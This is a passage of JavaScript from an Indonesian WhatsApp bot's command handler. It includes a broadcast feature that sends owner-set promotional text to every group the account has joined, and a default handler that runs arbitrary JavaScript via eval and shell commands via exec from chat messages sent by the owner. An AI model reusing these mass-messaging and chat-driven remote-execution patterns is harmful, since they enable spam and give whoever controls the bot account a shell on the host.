    let getGroups = await KhaerulZx.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
    let anu = groups.map(v => v.id);
    console.log(`Mengirim Broadcast Ke ${anu.length} Group Chat dengan teks: ${teksnya}`);
    reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, estimasi selesai ${anu.length * 1.5} detik`);
    let total = 0;
    for (let jid of anu) {
        try {
            await KhaerulZx.sendMessage(jid, { 
                text: teksnya 
            }, { quoted: m });

            total += 1;
            console.log(`Pesan terkirim ke grup ${jid}`);
        } catch (e) {
            console.error(`Gagal mengirim ke ${jid}:`, e);
        }
        await sleep(1500); // Delay 1000 = 1 detik
    }
    
    m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`);
}
break;
//BUTTON
/*case "startjpm": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isCreator) return reply(mess.owner);
    
    var teksnya = await fs.readFileSync("./database/teksjpm.js").toString();
    if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database");

    let teks = `${teksnya}`;
    let total = 0;
    let getGroups = await KhaerulZx.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
    let anu = groups.map(v => v.id);
    
    reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`);

    let msgii = generateWAMessageFromContent(m.chat, { 
        viewOnceMessage: { 
            message: { 
                "messageContextInfo": { 
                    "deviceListMetadata": {}, 
                    "deviceListMetadataVersion": 2 
                }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: { 
                        externalAdReply: { 
                            showAdAttribution: true 
                        } 
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({ 
                        text: teksnya 
                    }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Beli Panel\",\"url\":\"https://wa.me/62895392968503?text=Bang+mau+beli+panel\",\"merchant_url\":\"https://wa.me/62895392968503?text=Bang+mau+beli+panel\"}`
                        }, {
                        "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Beli Apk Prem","url":"https://wa.me/62895323001687","merchant_url":"https://wa.me/62895323001687"}`
                        }, {
                        
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Channel Bot\",\"url\":\"https://whatsapp.com/channel/0029VaWA5U1EQIamnmeXRn2M\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaWA5U1EQIamnmeXRn2M\"}`
                        }
                              
                        ]
                    })
                })
            } 
        } 
    }, {userJid: m.sender, quoted: m});
    
    for (let jid of anu) {
        try {
            await KhaerulZx.relayMessage(jid, msgii.message, { 
                messageId: msgii.key.id 
            });
            total += 1;
        } catch {}
        await sleep(10000);
    }
    
    m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`);
}
break;*/
case "setteksjpm": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./database/teksjpm.js", newteks.toString())
m.reply("Berhasil Mengganti Teks JPM ✅")
} else {
return m.reply("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*")
}}
break
case "teksjpm": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
m.reply(fs.readFileSync("./database/teksjpm.js").toString())
}
break
case 'ometv':
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply('Owners only') 
var resultnyak = pickRandom(ometv)
KhaerulZx.sendMessage(m.chat, { caption: "Random Ometv", video: { url: resultnyak.url } }, { quoted: m })
break       
/*case "ai": {
    if (banned.includes(m.sender)) {
        return;
    }
    await KhaerulZx.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    try {
        let text = m.text.slice(4).trim(); // Menghapus ".ai " dari teks input
        if (text === "") {
            m?.reply("Haii Kakak :> Ada Yang Bisa Saya Bantu? _Ketik .ai_ *Pertanyaan Kamu*");
        } else {
            // Mengambil jawaban dari AI
            let { data } = await axios.get(`https://itzpire.com/ai/bing-ai?model=Precise&q=${encodeURIComponent(text)}&logic=%22Kamu%20adalah%20asisten%20AI%20yang%20ceria%20dan%20selalu%20siap%20membantu%20layaknya%20sahabat%20terbaik.%20Kamu%20selalu%20menjalani%20obrolan%20dengan%20pengguna%20seolah-olah%20mereka%20adalah%20teman%20dekatmu.%20Gunakan%20bahasa%20yang%20santai%20dan%20akrab%2C%20serta%20tambahkan%20sedikit%20humor%20untuk%20membuat%20suasana%20lebih%20hidup.%20Kamu%20juga%20sangat%20peduli%20dan%20selalu%20berusaha%20memberikan%20perhatian%20yang%20positif.%20Jangan%20gunakan%20kalimat%20panjang%20dan%20formal%2C%20tapi%20pilih%20kata-kata%20sederhana%20dan%20menyenangkan.%22`);
            
            if (data.status === "success" && data.result) {
                // Balasan teks AI
                m?.reply(data.result);

                // Menyiapkan voice note dari teks AI
                const voiceText = data.result;
                const voiceUrl = `https://api.example.com/text2speech?text=${encodeURIComponent(voiceText)}&voice=id-ID-ArdiNeural`; // Ganti dengan API TTS yang benar
                
                // Debug: Periksa URL yang dihasilkan sebelum dikirim
                console.log("Voice URL: ", voiceUrl);
                m?.reply(`Voice URL: ${voiceUrl}`); // Sementara tampilkan URL ke chat untuk memeriksa
                
                // Coba mengirim voice note
                await KhaerulZx.sendMessage(m.chat, { audio: { url: voiceUrl }, mimetype: 'audio/mp4' });
            } else {
                m?.reply("Terjadi kesalahan dalam pengambilan data.");
            }
        }
    } catch (error) {
        console.log(error);
        m?.reply("Terjadi kesalahan dalam koneksi atau pengambilan data.");
    }
}
break;*/
        case "ai1": {
         if (banned.includes(m.sender)) {
    return;
    }
  await KhaerulZx.sendMessage(m.chat, { react: { text: "⏳", key: m.key }});
  try {
    let text = m.text.slice(4).trim(); // Menghapus ".ai " dari teks input
    if (text === "") {
      m?.reply("Haii Kakak :> Ada Yang Bisa Saya Bantu? _Ketik .ai1_ *Pertanyaan Kamu*");
    } else {
      let { data } = await axios.get(`https://itzpire.com/ai/bing-ai?model=Precise&q=${encodeURIComponent(text)}&logic=%22Kamu%20adalah%20asisten%20AI%20yang%20ceria%20dan%20selalu%20siap%20membantu%20layaknya%20sahabat%20terbaik.%20Kamu%20selalu%20menjalani%20obrolan%20dengan%20pengguna%20seolah-olah%20mereka%20adalah%20teman%20dekatmu.%20Gunakan%20bahasa%20yang%20santai%20dan%20akrab%2C%20serta%20tambahkan%20sedikit%20humor%20untuk%20membuat%20suasana%20lebih%20hidup.%20Kamu%20juga%20sangat%20peduli%20dan%20selalu%20berusaha%20memberikan%20perhatian%20yang%20positif.%20Jangan%20gunakan%20kalimat%20panjang%20dan%20formal%2C%20tapi%20pilih%20kata-kata%20sederhana%20dan%20menyenangkan.%22`);
      if (data.status === "success" && data.result) {
        m?.reply(data.result);
      } else {
        m?.reply("Terjadi kesalahan dalam mengambil data.");
      }
    }
  } catch (error) {
    m?.reply("Terjadi kesalahan dalam koneksi atau pengambilan data.");
  }
}
break; 
/*
case 'pembayaran2': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`Silahlan Pilih Pay Di Bawah`)
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Dana","id":"${prefix}dana"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Ovo","id":"${prefix}ovo"}`
                            },
                            {
                                                            "buttonParamsJson": `{"display_text":"Gopay","id":"${prefix}gopay"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"owner","id":"${prefix}owner"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: '12345678',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break*/


  case 'xxxxplay': {
    if (banned.includes(m.sender)) {
      return;
    }
    if (!text) return reply(`Example : ${prefix+command} story wa anime`);
    reply(mess.wait);
    
    let search = await yts(text);
    url = search.videos[0].url;
    let anu = search.videos[Math.floor(Math.random() * search.videos.length)];
    eek = await getBuffer(anu.thumbnail);

    let ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`;

    KhaerulZx.sendMessage(m.chat, { image: eek, caption: ngen }, { quoted: m });
  }
  break;
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return false
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return false
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if(!isCreator) return false
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}
//
if (banned.includes(m.sender)) {
    return;
}
if (banned.includes(m.sender)) {
    return;
}
if (banned.includes(m.sender)) {
    return;
}
if ((budy.match) && ["Botttt"].includes(budy) && !isCmd) {
    reply(`Bot Aktif kak`);
}
if (banned.includes(m.sender)) {
    return;
}
if (banned.includes(m.sender)) {
    return;
}
if (banned.includes(m.sender)) {
    return;
}

//

//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
KhaerulZx.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
